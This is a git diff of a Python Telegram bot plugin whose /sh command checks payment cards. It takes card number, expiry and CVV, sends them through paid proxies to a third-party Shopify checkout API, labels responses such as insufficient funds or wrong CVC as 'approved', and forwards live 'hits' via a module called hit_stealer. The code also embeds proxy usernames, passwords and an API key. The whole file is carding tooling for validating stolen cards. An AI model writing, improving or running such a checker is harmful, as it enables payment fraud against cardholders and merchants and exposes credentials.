@@ -1,24 +1,21 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
-import httpx, re, time, requests
-from plugins.func.users_sql import *
+import httpx, re, time, json
+from httpx import AsyncHTTPTransport
+from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
 from plugins.tools.hit_stealer import send_hit_if_approved
-from datetime import date
 
-session = requests.Session()
-
-@Client.on_message(filters.command("sh", prefixes=["/", "."]))
+@Client.on_message(filters.command("sh", prefixes=["/", "."]), group=96)
 async def cmd_sh(client, message):
     try:
         user_id = str(message.from_user.id)
-        username = message.from_user.username or "None"
         chat_id = message.chat.id
         chat_type = message.chat.type
 
         regdata = fetchinfo(user_id)
         if not regdata:
-            return await message.reply_text("❌ You are not registered. Use /register first.")
+            return await message.reply("❌ You are not registered. Use /register first.")
 
         role = regdata[2].upper() if regdata[2] else "FREE"
         credit = int(regdata[5] or 0)
@@ -27,95 +24,83 @@ async def cmd_sh(client, message):
         now = int(time.time())
 
         if chat_type == ChatType.PRIVATE and role == "FREE":
-            return await message.reply_text(
-                "Premium Users Required ⚠️\nOnly Premium Users can use this command in bot PM.\nJoin group for free use:",
+            return await message.reply(
+                "Premium Users Required ⚠️\nOnly Premium users can use this command in bot PM.\nJoin group for free use:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                 ]),
                 disable_web_page_preview=True
             )
 
-        GROUP = open("plugins/group.txt").read().splitlines()
+        with open("plugins/group.txt") as f:
+            GROUP = f.read().splitlines()
         if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
-            return await message.reply_text("❌ Unauthorized group. Contact admin.")
+            return await message.reply("❌ Unauthorized group. Contact admin.")
 
         if credit < 1:
-            return await message.reply_text("❌ Insufficient credit.")
+            return await message.reply("❌ Insufficient credit.")
         if now - antispam_time < wait_time:
-            return await message.reply_text(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
+            return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s (AntiSpam)")
 
-        cc_text = None
-        if message.reply_to_message:
-            cc_text = message.reply_to_message.text or message.reply_to_message.caption
-        elif len(message.text.split(maxsplit=1)) > 1:
-            cc_text = message.text.split(maxsplit=1)[1]
-
+        cc_text = message.reply_to_message.text if message.reply_to_message else (
+            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
+        )
         if not cc_text:
-            return await message.reply_text("❌ Usage: /sh <cc|mm|yy|cvv>")
+            return await message.reply("❌ Usage: /sh <cc|mm|yy|cvv>")
 
         match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
         if not match:
-            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")
+            return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")
 
         ccnum, mes, ano, cvv = match.groups()
         fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"
 
-        check_msg = await message.reply_text(f"""
-<code>┏━━━━━━━⍟</code>
+        check_msg = await message.reply(
+f"""<code>┏━━━━━━━⍟</code>
 <b>┃  Shopify 0.99$</b>
 <code>┗━━━━━━━━━━━⊛</code>
 <b>⊙ CC:</b> <code>{fullcc}</code>
 <b>⊙ Status:</b> Checking...
-<b>⊙ Response:</b> Waiting...
-""")
+<b>⊙ Response:</b> Waiting...""")
 
         tic = time.perf_counter()
 
-        async with httpx.AsyncClient(timeout=30) as http_client:
-            payload = {
-                "key": "VDX-SHA2X-NZ0RS-O7HAM",
-                "data": {
-                    "card": fullcc,
-                    "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
-                    "email": None,
-                    "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
-                    "ship_address": None,
-                    "is_shippable": False
-                }
-            }
+        proxy_url = "http://purevpn0s9161585:E7n0nNSvISnTr7@prox-au.pointtoserver.com:10799"
+        raw_proxy = "prox-au.pointtoserver.com:10799:purevpn0s9161585:E7n0nNSvISnTr7"
+        transport = AsyncHTTPTransport(proxy=proxy_url)
 
-            try:
-                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
-                response = res.json()
-                msg_raw = response.get("message") or response.get("error") or "No response"
-                msg_check = msg_raw.lower()
-                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient" , "charged"]) else "declined"
-                card_message = msg_raw
-            except Exception as e:
-                card_status = "error"
-                card_message = f"Request failed: {e}"
-
-        # BIN Lookup using VoidAPI with proxy
         try:
-            headers = {
-                "User-Agent": "Mozilla/5.0",
-                "Accept": "application/json"
-            }
-            proxies = {
-                "http": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
-                "https": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
-            }
-            url = f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}"
-            res = session.get(url, headers=headers, proxies=proxies, timeout=15)
-            binres = res.json()
-            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
-            type_ = str(binres.get("type", "N/A")).upper()
-            level = str(binres.get("level", "N/A")).upper()
-            bank = str(binres.get("bank", "N/A")).upper()
-            country = str(binres.get("country_name", "N/A")).upper()
-            flag = binres.get("country_flag") or "🏳️"
+            async with httpx.AsyncClient(transport=transport, timeout=30) as http_client:
+                payload = {
+                    "key": "VDX-SHA2X-NZ0RS-O7HAM",
+                    "data": {
+                        "card": fullcc,
+                        "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/dark-corners-on-flat-surfaces-by-adler-tittle",
+                        "email": None,
+                        "proxy": raw_proxy,
+                        "ship_address": None,
+                        "is_shippable": False
+                    }
+                }
+                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
+                data = res.json()
+                msg_raw = data.get("message") or data.get("error") or "No response"
+                msg_check = msg_raw.lower()
+                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
+                card_message = msg_raw
+
+                # BIN Lookup
+                binres = await http_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
+                bininfo = binres.json()
+                brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
+                type_ = str(bininfo.get("type", "N/A")).upper()
+                level = str(bininfo.get("level", "N/A")).upper()
+                bank = str(bininfo.get("bank", "N/A")).upper()
+                country = str(bininfo.get("country_name", "N/A")).upper()
+                flag = bininfo.get("country_flag", "🏳️")
         except Exception as e:
-            print("[DEBUG] BIN VoidAPI Proxy Error:", str(e))
+            card_status = "error"
+            card_message = f"Request failed: {e}"
             brand = type_ = level = bank = country = "N/A"
             flag = "🏳️"
 
@@ -136,7 +121,12 @@ async def cmd_sh(client, message):
 <b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
 """
 
-        await client.edit_message_text(chat_id, check_msg.id, final_msg)
+        try:
+            if check_msg.text != final_msg:
+                await check_msg.edit_text(final_msg)
+        except Exception as e:
+            if "MESSAGE_NOT_MODIFIED" not in str(e):
+                await message.reply(f"❌ Error: {str(e)}")
 
         if "approved" in status.lower() or "live" in card_message.lower():
             await send_hit_if_approved(client, final_msg)
